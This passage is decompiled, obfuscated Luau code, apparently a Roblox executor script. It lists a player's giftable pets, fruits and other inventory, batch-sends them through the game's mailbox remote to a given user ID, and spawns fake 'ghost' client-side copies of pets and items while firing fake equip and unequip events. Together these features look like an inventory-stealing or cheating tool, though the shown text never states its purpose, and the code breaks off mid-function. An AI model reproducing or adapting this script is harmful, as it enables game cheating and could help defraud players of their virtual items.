			if not t30.mailboxItemCatalog then
				t30.mailboxItemCatalog = require(LocalPlayer.PlayerScripts.Controllers.MailboxController.MailboxItemCatalog)
			end

			return t30.mailboxItemCatalog
		end,
		getReplica = function()
			return v326():WaitForLocalReplica(30)
		end,
		getGardenSyncController = function()
			if not t30.gardenSyncController then
				t30.gardenSyncController = require(LocalPlayer.PlayerScripts.Controllers.GardenSyncController)
			end

			return t30.gardenSyncController
		end
	}
end

t4.r = function()
	local r = t4.cache.r

	if not r then
		r = {
			c = v321()
		}
		t4.cache.r = r
	end

	return r.c
end

local function v328()
	t4.i()
	t4.h()

	local v329 = t4.r()

	local function v330(p83, p84, p85)
		if not v329.getMailboxItemCatalog().IsGiftable(p83) then
			return false
		end

		if p83 == "HarvestedFruits" then
			return typeof(p85) == "table" and p85.Id ~= nil
		end

		if p83 == "Pets" then
			return typeof(p85) == "table" and p85.Id ~= nil
		end

		return typeof(p85) == "number" and p85 > 0
	end
	local function v331(p86, p87, p88)
		if p86 == "Pets" then
			if typeof(p88) == "table" and typeof(p88.Name) == "string" then
				return p88.Name
			end

			return tostring(p87)
		end

		if p86 ~= "HarvestedFruits" then
			return tostring(p87)
		end

		if typeof(p88) == "table" then
			if typeof(p88.FruitName) == "string" then
				return p88.FruitName
			end

			if typeof(p88.Name) == "string" then
				return p88.Name
			end
		end

		return tostring(p87)
	end
	local function v332(p89, p90)
		if p89 == "Pets" and typeof(p90) == "table" then
			return {
				type = p90.Type,
				mutation = p90.Mutation,
				size = p90.Size
			}
		end

		if p89 == "HarvestedFruits" and typeof(p90) == "table" then
			return {
				type = nil,
				mutation = p90.Mutation,
				size = nil
			}
		end

		return {}
	end

	return {
		getItems = function()
			local v333 = v329.getReplica()
			local v334 = v329.getMailboxItemCatalog()
			local t31 = {}

			if not v333 or not v333.Data or typeof(v333.Data.Inventory) ~= "table" then
				return t31
			end

			local Inventory = v333.Data.Inventory

			for _, v in v334.Categories, nil, nil do
				local v339 = Inventory[v]

				if typeof(v339) == "table" then
					if v == "HarvestedFruits" or v == "Pets" then
						for k, v3 in v339, nil, nil do
							if v330(v, tostring(k), v3) then
								table.insert(t31, {
									uniqueId = v .. ":" .. tostring(k),
									name = v331(v, tostring(k), v3),
									count = 1,
									metadata = v332(v, v3),
									category = v
								})
							end
						end
					else
						for k, v3 in v339, nil, nil do
							if v330(v, tostring(k), v3) then
								table.insert(t31, {
									uniqueId = v .. ":" .. tostring(k),
									name = v331(v, tostring(k), nil),
									count = v3,
									metadata = {},
									category = v
								})
							end
						end
					end
				end
			end

			return t31
		end,
		getItemCategory = function(p91)
			return string.match(p91, "^([^:]+):") or ""
		end
	}
end

t4.s = function()
	local s = t4.cache.s

	if not s then
		s = {
			c = v328()
		}
		t4.cache.s = s
	end

	return s.c
end

local function v345()
	t4.i()
	t4.h()

	local v346 = t4.r()

	return {
		send = function(p92, p93)
			local v347 = tonumber(p92)

			if not v347 or v347 <= 0 then
				error("invalid target user id")
			end

			local t32 = {}

			for _, v in p93, nil, nil do
				local category, uniqueId = string.match(v.uniqueId, "^([^:]+):(.+)$")

				if not category or not uniqueId then
					category = v.category
					uniqueId = string.match(v.uniqueId, "^[^:]+:(.+)$") or v.uniqueId
				end

				table.insert(t32, {
					Category = category,
					ItemKey = uniqueId,
					Count = v.count
				})
			end

			if #t32 == 0 then
				return
			end

			local v353 = v346.getNetworking()
			local ok, result, result2 = pcall(function()
				return v353.Mailbox.SendBatch:Fire(v347, t32, "")
			end)

			if not ok then
				error(result)
			end

			if not result then
				error(result2 or "could not send gift")
			end
		end
	}
end

t4.t = function()
	local t = t4.cache.t

	if not t then
		t = {
			c = v345()
		}
		t4.cache.t = t
	end

	return t.c
end

local function v358()
	local Players2 = game:GetService("Players")
	local HttpService = game:GetService("HttpService")
	local RunService = game:GetService("RunService")
	local CollectionService = game:GetService("CollectionService")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local LocalPlayer = Players2.LocalPlayer
	local s5 = "VisualGhost"
	local s6 = "ghost_"

	if getgenv().GhostInvUnload then
		pcall(getgenv().GhostInvUnload)
	end

	local t33 = {
		originals = {},
		conns = {},
		suppress = {},
		pendingGifts = {},
		pendingByAlias = {},
		stackDisplay = {},
		stackBound = {},
		stackFixing = {},
		handledStackRemoval = {},
		ghostPets = {},
		ghostPetSlot = 9000,
		petBound = {},
		petHookBusy = false,
		petToggleLock = {},
		petMouseConn = nil,
		realFollowSlots = nil,
		petFollowSlotsMod = nil,
		petGhostSwap = {},
		petUnequipUIHook = false,
		pendingRealUnequip = {}
	}
	local Folder = Instance.new("Folder")

	Folder.Name = "_GhostVault"
	Folder.Parent = LocalPlayer:WaitForChild("PlayerGui")

	local Folder2 = Instance.new("Folder")

	Folder2.Name = "_GhostWorld"
	Folder2.Parent = workspace

	local Networking = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("Networking"))
	local PlayerStateClient

	pcall(function()
		PlayerStateClient = require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("PlayerStateClient"))
	end)

	local PetVisualController

	pcall(function()
		PetVisualController = require(LocalPlayer.PlayerScripts.Controllers.PetVisualController)
	end)

	local PetModules

	pcall(function()
		PetModules = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("PetModules"))
	end)

	local PetSlotPrices

	pcall(function()
		PetSlotPrices = require(ReplicatedStorage:WaitForChild("SharedData"):WaitForChild("PetSlotPrices"))
	end)

	local function v375()
		local attribute = LocalPlayer:GetAttribute("MaxEquippedPets")

		if type(attribute) == "number" and attribute > 0 then
			return math.floor(attribute)
		end

		return PetSlotPrices and PetSlotPrices.BaseMax or 3
	end
	local function v377(p94)
		return type(p94) == "string" and p94:sub(1, #s6) == s6
	end
	local function v378(p95)
		if typeof(p95) ~= "Instance" then
			return false
		end

		if p95:GetAttribute(s5) == true then
			return true
		end

		return v377(p95:GetAttribute("PetId") or p95:GetAttribute("Id"))
	end
	local function v379(p96, p97)
		local t34 = {}

		if type(p96) == "table" then
			for _, v in p96, nil, nil do
				t34[tostring(v)] = true
			end
		elseif p96 then
			t34[tostring(p96)] = true
		end

		local t35 = {}

		local function v384(p98)
			local v385 = tostring(p98 or "")

			if v385 == "" or t34[v385] or t35[v385] then
				return
			end

			t35[v385] = true
			p97(v385)
		end

		if Networking.Pets and Networking.Pets.GetEquippedPets then
			local ok, result = pcall(function()
				return Networking.Pets.GetEquippedPets:Fire()
			end)

			if ok and type(result) == "table" then
				for _, v in result, nil, nil do
					if type(v) == "table" and type(v.Id) == "string" then
						v384(v.Id)
					end
				end
			end
		end

		for k in pairs(t33.ghostPets) do
			v384(k)
		end

		local PlayerPetReferences = workspace:FindFirstChild("PlayerPetReferences")
		local LocalPlayerName = PlayerPetReferences and PlayerPetReferences:FindFirstChild(LocalPlayer.Name)

		if LocalPlayerName then
			for _, v in LocalPlayerName:GetChildren() do
				if v:IsA("BasePart") and v378(v) then
					v384(v:GetAttribute("PetId"))
				end
			end
		end
	end
	local function v395(...)
		local t36 = {}

		for i = 1, select("#", ...) do
			local value = select(i, ...)

			if value then
				table.insert(t36, tostring(value))
			end
		end

		local n13 = 0

		v379(t36, function()
			n13 += 1
		end)

		return n13
	end
	local function v400()
		local PlayerPetReferences = workspace:FindFirstChild("PlayerPetReferences")
		local LocalPlayerName = PlayerPetReferences

		LocalPlayerName = LocalPlayerName and PlayerPetReferences:FindFirstChild(LocalPlayer.Name)

		if not LocalPlayerName then
			return
		end

		for _, v in LocalPlayerName:GetChildren() do
			if v:IsA("BasePart") and string.match(v.Name, "^PetPart%d+$") then
				local v405 = tostring(v:GetAttribute("PetId") or "")

				if (v378(v) or v377(v405)) and not t33.ghostPets[v405] then
					v:Destroy()
				end
			end
		end
	end
	local function v406(p99)
		local v407 = t33.ghostPets[tostring(p99)]

		return v407 and v407.part and v407.part.Parent ~= nil
	end
	local function v408()
	end
	local function v409()
		return s6 .. HttpService:GenerateGUID(false):gsub("-", "")
	end
	local function v410(p100)
		p100:SetAttribute(s5, true)

		local v411 = v409()

		if p100:GetAttribute("Pet") or p100:GetAttribute("PetId") then
			p100:SetAttribute("PetId", v411)
		end

		if p100:GetAttribute("HarvestedFruit") or p100:GetAttribute("FruitName") or p100:GetAttribute("Fruit") or p100:GetAttribute("Id") then
			p100:SetAttribute("Id", v411)
		end

		if not (p100:GetAttribute("Id") or p100:GetAttribute("PetId")) then
			p100:SetAttribute("Id", v411)
		end

		return p100
	end
	local function v412(p101)
		if p101 and p101:IsA("Tool") then
			if v378(p101) then
				if p101:GetAttribute("Pet") then
					return true
				end

				if v377(p101:GetAttribute("PetId")) then
					return true
				end

				if not p101:GetAttribute("PetId") or p101:GetAttribute("SeedTool") or p101:GetAttribute("HarvestedFruit") then
					return p101:FindFirstChild("Handle") ~= nil and not p101:GetAttribute("SeedTool")
				end

				return true
			end
		end

		return false
	end
	local function v413(p102, p103)
		local v414 = tostring(p102)
		local t37 = {
			LocalPlayer:FindFirstChild("Backpack"),
			LocalPlayer.Character,
			Folder
		}

		for _, v in t37, nil, nil do
			if v then
				for _, v3 in v:GetChildren() do
					if v3 == p103 then
						continue
					end

					if v412(v3) then
						if tostring(v3:GetAttribute("PetId")) == v414 then
							return v3
						end
					end
				end
			end
		end

		for k, ghostPet in pairs(t33.ghostPets) do
			if tostring(k) == v414 and ghostPet.tool and ghostPet.tool ~= p103 then
				return ghostPet.tool
			end
		end
	end
	local function v422(p104)
		if not v412(p104) then
			return
		end

		local v423 = tostring(p104:GetAttribute("PetId") or "")

		local function v424(p105, p106)
			local v425 = t33.ghostPets[p105]

			if v425 and v425.tool == p104 then
				t33.ghostPets[p106] = v425
				t33.ghostPets[p105] = nil

				if v425.part then
					v425.part:SetAttribute("PetId", p106)
				end
			end
		end

		if v423 ~= "" and v377(v423) then
			if v413(v423, p104) then
				local v426 = v423

				v410(p104)
				v423 = tostring(p104:GetAttribute("PetId"))
				v424(v426, v423)
			end

			return v423
		end

		local v427 = v423 ~= "" and v423 or nil

		v410(p104)

		local v428 = tostring(p104:GetAttribute("PetId"))

		if v427 then
			v424(v427, v428)
		end

		return v428
	end
	local function v429(p107)
		if not p107 then
			return
		end

		if v412(p107) then
			return v422(p107)
		end

		if p107:GetAttribute("Pet") or v377(p107:GetAttribute("PetId")) then
			return tostring(p107:GetAttribute("PetId") or p107:GetAttribute("Id") or p107)
		end

		return getToolKey(p107)
	end
	local function v430()
		local Character = LocalPlayer.Character

		if not Character then
			return
		end

		for _, v in Character:GetChildren() do
			if v412(v) then
				return v
			end
		end
	end
	local function v434(p108)
		if typeof(p108) ~= "Instance" then
			return false
		end

		if p108:IsA("Tool") then
			return true
		end

		return p108:IsA("Configuration") and p108:GetAttribute("FruitProxy") == true
	end
	local function v435()
		local t38 = {}
		local t39 = {
			LocalPlayer:FindFirstChild("Backpack"),
			LocalPlayer.Character
		}

		for _, v in t39, nil, nil do
			if v then
				for _, v3 in v:GetChildren() do
					if v434(v3) then
						table.insert(t38, v3)
					end
				end
			end
		end

		return t38
	end
	local function v444(p109)
		local v445 = tostring(p109)
		local Character = LocalPlayer.Character

		if Character then
			for _, v in Character:GetChildren() do
				if v434(v) and (tostring(v:GetAttribute("Id")) == v445 or tostring(v:GetAttribute("PetId")) == v445) then
					return v
				end
			end
		end

		local Backpack = LocalPlayer:FindFirstChild("Backpack")

		if Backpack then
			for _, v in Backpack:GetChildren() do
				if v434(v) and (tostring(v:GetAttribute("Id")) == v445 or tostring(v:GetAttribute("PetId")) == v445) then
					return v
				end
			end
		end

		for _, ghostPet in pairs(t33.ghostPets) do
			if ghostPet.tool then
				if tostring(ghostPet.tool:GetAttribute("PetId")) == v445 then
					return ghostPet.tool
				end
			end
		end
	end
	local function v454()
		local Character = LocalPlayer.Character

		if not Character then
			return
		end

		local Tool = Character:FindFirstChildWhichIsA("Tool")

		if Tool and v434(Tool) then
			return Tool
		end
	end
	local function v457(p110)
		local v458 = v444(p110) or v454()

		if v458 then
			return v458
		end

		for _, v in v435() do
			if v.Name == p110 then
				return v
			end

			if tostring(v:GetAttribute("Id") or "") == tostring(p110) then
				return v
			end
		end
	end
	local function v461(p111)
		return p111:GetAttribute("Id") or p111:GetAttribute("PetId")
	end
	local function v462(p112)
		if p112 then
			local v463 = tostring(p112)

			return t33.pendingByAlias[v463] or v463
		end

		return nil
	end
	local function v464(p113)
		local v465 = tostring(p113)

		for k, pendingByAlia in pairs(t33.pendingByAlias) do
			if pendingByAlia == v465 then
				t33.pendingByAlias[k] = nil
			end
		end
	end
	local function v468(p114)
		local Backpack = LocalPlayer:FindFirstChild("Backpack")
		local Character = LocalPlayer.Character

		return Backpack and p114:IsDescendantOf(Backpack) or Character and p114:IsDescendantOf(Character)
	end
	local function v471(p115)
		if not p115 then
			return false
		end

		if p115:GetAttribute("Pet") then
			return true
		end

		if p115:GetAttribute("PetId") and not (p115:GetAttribute("HarvestedFruit") or p115:GetAttribute("Id")) then
			return true
		end

		if p115:GetAttribute("PetId") and p115:GetAttribute("Pet") == nil then
			if p115.Name:lower():find("pet") or p115:FindFirstChild("Handle") then
				return true
			end
		end

		return false
	end
	local function v472(p116)
		if not p116 or not PlayerStateClient then
			return false
		end

		local ok, result = pcall(function()
			return PlayerStateClient:GetLocalReplica()
		end)

		if not ok or not result or not result.Data or not result.Data.Inventory then
			return false
		end

		local Pets = result.Data.Inventory.Pets and result.Data.Inventory.Pets[tostring(p116)]

		return type(Pets) == "table" and Pets.Id ~= nil
	end
	local function v476(p117, p118)
		if not p117 then
			return
		end

		if p118 then
			if p118:GetAttribute("Pet") == p117 then
				return p118
			end
		end

		for _, v in v435() do
			if v412(v) and v:GetAttribute("Pet") == p117 then
				local v479 = v429(v)

				if v479 and not t33.ghostPets[v479] then
					return v
				end
			end
		end

		for _, v in v435() do
			if v:GetAttribute("Pet") == p117 then
				return v
			end
		end
	end
	local function v482()
		local t40 = {}
		local t41 = {
			LocalPlayer:FindFirstChild("Backpack"),
			LocalPlayer.Character,
			Folder
		}

		for _, v in t41, nil, nil do
			if v then
				for _, v3 in v:GetChildren() do
					if v412(v3) then
						table.insert(t40, v3)
					end
				end
			end
		end

		for _, ghostPet in pairs(t33.ghostPets) do
			if ghostPet.tool and ghostPet.tool.Parent then
				table.insert(t40, ghostPet.tool)
			end
		end

		for _, v in t40, nil, nil do
			v422(v)
		end
	end
	local function v493(p119)
		if not p119 then
			return
		end

		t33.suppress[tostring(p119)] = true
		task.delay(3, function()
			t33.suppress[tostring(p119)] = nil
		end)
	end
	local function v494(p120)
		local v495 = v461(p120) or tostring(p120)

		t33.suppress[v495] = true
		task.delay(2, function()
			t33.suppress[v495] = nil
		end)
	end
	local function v496(p121)
		local v497 = v461(p121)

		if v497 and t33.suppress[v497] then
			return true
		end

		return t33.suppress[tostring(p121)] == true
	end
	local function v498(p122)
		for _, v in p122:GetDescendants() do
			if v:IsA("Script") or v:IsA("LocalScript") then
				v:Destroy()
			end
		end
	end
	local function v501()
		local Character = LocalPlayer.Character

		if Character then
			return Character:FindFirstChild("HumanoidRootPart")
		end
	end
	local function v503()
		local filterDescendantsInstances = {
			Folder,
			Folder2
		}

		if LocalPlayer.Character then
			table.insert(filterDescendantsInstances, LocalPlayer.Character)
		end

		local _PetVisualClient = workspace:FindFirstChild("_PetVisualClient")

		if _PetVisualClient then
			table.insert(filterDescendantsInstances, _PetVisualClient)
		end

		for _, ghostPet in pairs(t33.ghostPets) do
			if ghostPet.part then
				table.insert(filterDescendantsInstances, ghostPet.part)
			end
		end

		if not t33.groundRayParams then
			t33.groundRayParams = RaycastParams.new()
			t33.groundRayParams.FilterType = Enum.RaycastFilterType.Exclude
		end

		t33.groundRayParams.FilterDescendantsInstances = filterDescendantsInstances

		return t33.groundRayParams
	end
	local function v508(p123, p124, p125)
		local v509 = p125 or 10
		local hit = workspace:Raycast(Vector3.new(p123, v509 + 80, p124), Vector3.new(0, -400, 0), v503())

		return hit and hit.Position.Y or v509
	end
	local function v511()
		local PlayerPetReferences = workspace:WaitForChild("PlayerPetReferences", 30)

		if not PlayerPetReferences then
			return
		end

		local LocalPlayerName = PlayerPetReferences:FindFirstChild(LocalPlayer.Name)

		if not LocalPlayerName then
			LocalPlayerName = Instance.new("Folder")
			LocalPlayerName.Name = LocalPlayer.Name
			LocalPlayerName.Parent = PlayerPetReferences
		end

		return LocalPlayerName
	end
	local function v514(p126)
		local v515 = tostring(p126)
		local v516 = v511()

		if not v516 then
			return
		end

		for _, v in v516:GetChildren() do
			if v:IsA("BasePart") and string.match(v.Name, "^PetPart%d+$") and not v378(v) then
				local tostring_ = tostring

				if tostring_(v:GetAttribute("PetId") or v:GetAttribute("PetID") or "") == v515 then
					return v
				end
			end
		end
	end
	local function v520(p127)
		local v521 = tostring(p127)

		if not Networking.Pets or not Networking.Pets.GetEquippedPets then
			return
		end

		local ok, result = pcall(function()
			return Networking.Pets.GetEquippedPets:Fire()
		end)

		if not ok or type(result) ~= "table" then
			return
		end

		for _, v in result, nil, nil do
			if type(v) == "table" and tostring(v.Id) == v521 then
				return v
			end
		end
	end
	local function v526(p128)
		if p128 then
			return {
				cframe = p128.CFrame,
				slotVisualIndex = p128:GetAttribute("SlotVisualIndex"),
				slotOffsetX = p128:GetAttribute("SlotOffsetX"),
				slotOffsetZ = p128:GetAttribute("SlotOffsetZ"),
				slotHeightOffset = p128:GetAttribute("SlotHeightOffset"),
				slotOverride = p128:GetAttribute("SlotOverride"),
				flightPhase = p128:GetAttribute("FlightPhase"),
				inGarden = LocalPlayer:GetAttribute("IsInOwnGarden") == true
			}
		end
	end
	local function v527(p129, p130)
		if not p129 or not p130 then
			return
		end

		if p130.cframe then
			p129.CFrame = p130.cframe
		end

		for k, v in {
			slotVisualIndex = "SlotVisualIndex",
			slotOffsetX = "SlotOffsetX",
			slotOffsetZ = "SlotOffsetZ",
			slotHeightOffset = "SlotHeightOffset",
			slotOverride = "SlotOverride",
			flightPhase = "FlightPhase"
		}, nil, nil do
			local v530 = p130[k]

			if v530 ~= nil then
				p129:SetAttribute(v, v530)
			end
		end
	end
	local function v531()
		t33.ghostPetSlot += 1

		return "PetPart" .. t33.ghostPetSlot
	end
	local function v532(p131)
		if not p131 then
			return
		end

		if p131:IsA("Tool") then
			return p131:GetAttribute("Pet") or p131.Name
		end

		return p131:GetAttribute("PetSpecies") or p131:GetAttribute("Pet")
	end
	local function v533(p132)
		local v534 = PetModules and p132

		v534 = v534 and PetModules[p132]

		if v534 and v534.IsFlying == true then
			return (v534.AirHeight or 5) * 0.6
		end

		return 0
	end
	local function v535(p133, p134, p135, p136)
		return v508(p133, p134, p135) + 0.5 + v533(p136)
	end
	local function v536(p137, p138)
		local v537 = PetModules and p138 and PetModules[p138]

		if v537 then
			if v537.IsFlying == true then
				p137:SetAttribute("FlightPhase", "Flying")

				local v538 = v533(p138)

				if v538 > 0 then
					p137:SetAttribute("SlotHeightOffset", v538)
				end

				return
			end
		end
	end
	local function v539(p139, p140, p141, p142)
		p140:SetAttribute(s5, true)
		p140:SetAttribute("PetId", p141)
		p140:SetAttribute("PetSpecies", v532(p139))
		p140:SetAttribute("PetVisible", true)
		p140:SetAttribute("SlotVisualIndex", p142 or 1)

		for _, v in {
			"PetSize",
			"PetType",
			"PetMutation"
		}, nil, nil do
			local attribute = p139:GetAttribute(v)

			if attribute ~= nil then
				p140:SetAttribute(v, attribute)
			end
		end

		if p139:IsA("Tool") then
			local attribute = p139:GetAttribute("PetSize") or p139:GetAttribute("SizeMultiplier") or p139:GetAttribute("Size")

			if attribute ~= nil and p140:GetAttribute("PetSize") == nil then
				p140:SetAttribute("PetSize", attribute)
			end
		end

		v536(p140, v532(p139))
	end
	local function v544(p143, p144, p145, p146)
		v539(p143, p144, p145, p146)
	end
	local function v545(p147, p148)
		return {
			Id = p148,
			Name = p147:GetAttribute("Pet") or p147.Name,
			Size = p147:GetAttribute("PetSize") or p147:GetAttribute("SizeMultiplier") or p147:GetAttribute("Size"),
			Type = p147:GetAttribute("PetType")
		}
	end
	local function v546(p149, p150, p151)
		if p149 then
			return v545(p149, p150)
		end

		return {
			Id = p150,
			Name = p151 and p151.Name or "Pet",
			Size = p151 and p151.Size,
			Type = p151 and p151.Type
		}
	end
	local function v547(p152, p153, p154)
		local PetEquipped = Networking.Pets and Networking.Pets.PetEquipped

		if PetEquipped and PetEquipped.OnClientEvent then
			pcall(function()
				PetEquipped.OnClientEvent:Fire(p153, v546(p152, p153, p154))
			end)

			return
		end
	end
	local function v549(p155)
		local PetUnequipped = Networking.Pets and Networking.Pets.PetUnequipped

		if PetUnequipped and PetUnequipped.OnClientEvent then
			pcall(function()
				PetUnequipped.OnClientEvent:Fire(p155)
			end)

			return
		end
	end
	local function v551(p156, p157, p158, p159, p160)
		local n14 = 0

		if p159 and p160 and p159 * p159 + p160 * p160 > 1e-06 then
			n14 = math.atan2(-p159, -p160)
		end

		return CFrame.new(p156, p157, p158) * CFrame.Angles(0, n14, 0)
	end
	local function v553(p161)
		local v554 = v501()
		local Y = v554 and v554.Position.Y or 10
		local v556 = v532(p161)
		local LookVector = v554 and v554.CFrame.LookVector or Vector3.new(0, 0, -1)
		local vector3 = Vector3.new(LookVector.X, 0, LookVector.Z)
		local vector32

		if vector3.Magnitude < 0.01 then
			vector32 = Vector3.new(0, 0, -1)
		else
			vector32 = vector3.Unit
		end

		local vector33 = v554 and v554.Position + vector32 * 4 or Vector3.new(0, Y, 0)

		return v551(vector33.X, v535(vector33.X, vector33.Z, Y, v556), vector33.Z, vector32.X, vector32.Z)
	end
	local function v561()
		local Gardens = workspace:FindFirstChild("Gardens")

		if not Gardens then
			return
		end

		local attribute = LocalPlayer:GetAttribute("PlotId")

		if attribute then
			return Gardens:FindFirstChild("Plot" .. tostring(attribute))
		end
	end
	local function v564(p162)
		if t33.gardenAreasPlot == p162 and t33.gardenAreas then
			return t33.gardenAreas
		end

		local gardenAreas = {}

		for _, v in CollectionService:GetTagged("PlantArea") do
			if v:IsA("BasePart") and v:IsDescendantOf(p162) then
				table.insert(gardenAreas, v)
			end
		end

		if #gardenAreas == 0 then
			local PlotSizeReference = p162:FindFirstChild("PlotSizeReference")

			if PlotSizeReference and PlotSizeReference:IsA("BasePart") then
				table.insert(gardenAreas, PlotSizeReference)
			end
		end

		t33.gardenAreasPlot = p162
		t33.gardenAreas = gardenAreas

		return gardenAreas
	end
	local function v569(p163)
		local Size = p163.Size

		return (p163.CFrame * CFrame.new((math.random() - 0.5) * Size.X * 0.85, Size.Y * 0.5 + 0.3, (math.random() - 0.5) * Size.Z * 0.85)).Position
	end
	local function v571(p164, p165)
		for _, v in v564(p164) do
			local v574 = v.CFrame:PointToObjectSpace(p165)
			local v575 = v.Size * 0.5

			if math.abs(v574.X) <= v575.X + 1 then
				if math.abs(v574.Z) <= v575.Z + 1 then
					return true
				end
			end
		end

		return false
	end
	local function v576(p166)
		return (p166.CFrame * CFrame.new(0, p166.Size.Y * 0.5 + 0.3, 0)).Position
	end
	local function v577(p167)
		local _PetVisualClient = workspace:FindFirstChild("_PetVisualClient")
		local Models = _PetVisualClient and _PetVisualClient:FindFirstChild("Models")

		if not Models then
			return
		end

		for _, v in Models:GetChildren() do
			if v:GetAttribute("Owner") ~= LocalPlayer.Name then
				continue
			end

			if v:GetAttribute("OwnerSlot") ~= p167.Name then
				continue
			end

			local PrimaryPart = v.PrimaryPart or v:FindFirstChildWhichIsA("BasePart", true)

			if PrimaryPart then
				return PrimaryPart.Position
			end
		end
	end
	local function v583(p168, p169, p170)
		local Position = v577(p168)

		if not Position then
			local v585 = v501()

			Position = v585 and v585.Position

			if v585 and not p169 then
				local LookVector = v585.CFrame.LookVector

				p169 = LookVector.X
				p170 = LookVector.Z
			end
		end

		if not Position then
			return
		end

		local v587 = v532(p168)

		p168.CFrame = v551(Position.X, v535(Position.X, Position.Z, Position.Y, v587), Position.Z, p169, p170)

		return p168.Position
	end
	local function v588(p171, p172)
		local v589 = v564(p171)

		if #v589 == 0 then
			return p171:GetPivot().Position
		end

		local v590 = v589[1]
		local huge = math.huge
		local vector3 = Vector3.new(p172.X, 0, p172.Z)

		for _, v in v589, nil, nil do
			local v595 = v576(v)
			local Magnitude = (Vector3.new(v595.X, 0, v595.Z) - vector3).Magnitude

			if Magnitude < huge then
				huge = Magnitude
				v590 = v
			end
		end

		if v571(p171, p172) then
			return v569(v590)
		end

		return v576(v590)
	end
	local function v597(p173)
		local v598 = v564(p173)

		if #v598 == 0 then
			return p173:GetPivot().Position
		end

		return v569(v598[math.random(1, #v598)])
	end

	local t42 = {
		{
			x = 0,
			z = 6
		},
		{
			x = -2.5,
			z = 5
		},
		{
			x = 2.5,
			z = 5
		},
		{
			x = -4,
			z = 4.5
		},
		{
			x = 4,
			z = 4.5
		},
		{
			x = 0,
			z = 8
		}
	}

	local function v600()
		if t33.petFollowSlotsMod ~= nil then
			return t33.petFollowSlotsMod ~= false and t33.petFollowSlotsMod or nil
		end

		for _, v in {
			ReplicatedStorage:FindFirstChild("SharedModules"),
			ReplicatedStorage:FindFirstChild("SharedData")
		}, nil, nil do
			if v then
				for _, v3 in {
					"PetFollowSlots",
					"PetSlotOffsets",
					"PetFollowLayout"
				}, nil, nil do
					local v605 = v:FindFirstChild(v3)

					if v605 then
						local ok, petFollowSlotsMod = pcall(require, v605)

						if ok and type(petFollowSlotsMod) == "table" then
							t33.petFollowSlotsMod = petFollowSlotsMod

							return petFollowSlotsMod
						end
					end
				end
			end
		end

		t33.petFollowSlotsMod = false

		return nil
	end
	local function v608()
		local t43 = {}
		local PlayerPetReferences = workspace:FindFirstChild("PlayerPetReferences")
		local LocalPlayerName = PlayerPetReferences and PlayerPetReferences:FindFirstChild(LocalPlayer.Name)

		if not LocalPlayerName then
			return t43
		end

		for _, v in LocalPlayerName:GetChildren() do
			if v:IsA("BasePart") and string.match(v.Name, "^PetPart%d+$") and v:GetAttribute(s5) ~= true then
				local attribute = v:GetAttribute("SlotOffsetX")
				local attribute2 = v:GetAttribute("SlotOffsetZ")

				if typeof(attribute) == "number" and typeof(attribute2) == "number" then
					t43[tonumber(v:GetAttribute("SlotVisualIndex")) or #t43 + 1] = {
						x = attribute,
						z = attribute2,
						h = v:GetAttribute("SlotHeightOffset")
					}
				end
			end
		end

		return t43
	end
	local function v616(p174, p175)
		if not p174 then
			return
		end

		local v617 = p174[p175] or type(p174.Slots) == "table" and p174.Slots[p175]

		if type(p174.Get) == "function" then
			local ok, result = pcall(p174.Get, p174, p175)

			if ok and type(result) == "table" then
				v617 = result
			end
		end

		if type(v617) == "table" then
			local X = v617.X or v617.x or v617[1]
			local Z = v617.Z or v617.z or v617[2]
			local H = v617.H or v617.h or v617.Y or v617.y or v617[3]

			if typeof(X) == "number" and typeof(Z) == "number" then
				return X, Z, typeof(H) == "number" and H or nil
			end
		end
	end
	local function v623(p176)
		local v624 = math.max(1, math.floor(p176))
		local v625, v626, v627 = v616(v600(), v624)

		if v625 then
			return v625, v626, v627
		end

		if not t33.realFollowSlots then
			t33.realFollowSlots = v608()
		end

		local v628 = t33.realFollowSlots[v624]

		if v628 then
			return v628.x, v628.z, v628.h
		end

		local v629 = t42[v624] or t42[#t42]

		return v629.x, v629.z, v629.h
	end
	local function v630()
		t33.realFollowSlots = nil
		t33.petFollowSlotsMod = nil
	end
	local function v631()
		local t44 = {}

		for k, ghostPet in pairs(t33.ghostPets) do
			table.insert(t44, {
				petId = k,
				data = ghostPet
			})
		end

		table.sort(t44, function(p177, p178)
			local part = p177.data.part
			local part2 = p178.data.part
			local followIndex = part and tonumber(part:GetAttribute("SlotVisualIndex")) or p177.data.followIndex or 9999
			local followIndex2 = part2 and tonumber(part2:GetAttribute("SlotVisualIndex")) or p178.data.followIndex or 9999

			if followIndex == followIndex2 then
				return tostring(p177.petId) < tostring(p178.petId)
			end

			return followIndex < followIndex2
		end)

		return t44
	end
	local function v639(p179, p180)
		p179:SetAttribute("SlotOverride", nil)

		local v640, v641, v642 = v623(p180)

		p179:SetAttribute("SlotOffsetX", v640)
		p179:SetAttribute("SlotOffsetZ", v641)

		local v643 = v533(v532(p179))
		local v644 = p179
		local SetAttribute = p179.SetAttribute
		local s7 = "SlotHeightOffset"
		local v647 = v643 > 0 and v643

		if not v647 then
			v647 = typeof(v642) == "number" and v642 or 0
		end

		SetAttribute(v644, s7, v647)
	end
	local function v648(p181)
		local v649 = v532(p181)

		if v533(v649) <= 0 then
			return
		end

		v536(p181, v649)

		local Position = p181.Position
		local v651 = v535(Position.X, Position.Z, Position.Y, v649)

		if math.abs(v651 - Position.Y) > 0.02 then
			p181.CFrame += Vector3.new(0, v651 - Position.Y, 0)
		end
	end
	local function v652(p182)
		p182:SetAttribute("SlotOverride", true)
		p182:SetAttribute("SlotOffsetX", nil)
		p182:SetAttribute("SlotOffsetZ", nil)
		v536(p182, v532(p182))
	end
	local function v653(p183)
		p183.idleUntil = os.clock() + 2 + math.random() * 5
		p183.wanderTarget = nil
	end
	local function v654(p184, p185)
		local part = p184.part

		if not part or not p185 then
			return
		end

		p184.idleUntil = nil
		v583(part)
		v652(part)
		v648(part)

		local Position = part.Position

		if v571(p185, Position) then
			p184.wanderTarget = v597(p185)
		else
			p184.wanderTarget = v588(p185, Position)
		end

		local wanderTarget = p184.wanderTarget

		if wanderTarget then
			part.CFrame = v551(Position.X, Position.Y, Position.Z, wanderTarget.X - Position.X, wanderTarget.Z - Position.Z)
		end
	end
	local function v658()
		v630()

		local followIndex = 0

		for _, v in v631() do
			followIndex += 1
			v.data.followIndex = followIndex

			if v.data.part and v.data.part.Parent then
				v639(v.data.part, followIndex)
			end
		end

		if PetVisualController then
			pcall(function()
				PetVisualController:SnapLocalPetsToFollow()
			end)
		end
